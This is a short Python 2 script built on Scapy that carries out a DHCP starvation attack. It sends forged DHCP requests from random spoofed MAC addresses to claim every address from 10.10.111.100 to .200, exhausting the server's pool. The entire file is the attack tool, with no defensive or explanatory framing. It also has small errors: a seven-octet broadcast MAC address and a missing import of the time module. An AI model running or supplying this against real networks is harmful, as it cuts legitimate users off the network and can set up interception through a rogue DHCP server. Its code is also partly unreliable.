import sys
import os
from scapy.all import*

def main():
    broadcast_add = "ff:ff:ff:ff:ff:ff:ff"
    conf.checkIpaddr = False

    subnet_ip_address = "10.10.111."

    def dhcp_starvation():
        for ip in range(100,201):
            for i in range (0,8):
                bogus_mac_address = RandMAC()
                dhcp_request = Ether(src = bogus_mac_address , dst = broadcast_add)
                dhcp_request /= IP(src   = "0.0.0.0" ,dst = "255.255.255.255")
                dhcp_request  /= UDP(sport = 68 , dport = 67)
                dhcp_request /= BOOTP(chaddr = bogus_mac_address)
                dhcp_request /= DHCP(options = [("message-type", "request"), ("server_id", "10.10.111.1"),     ("requested_addr", subnet_ip_address + str(ip)),"end"])
                sendp(dhcp_request)
                print "Requesting :" + subnet_ip_address + str(ip) + "\n"
                time.sleep(1)

    dhcp_starvation()

if __name__ == "__main__":
    main()

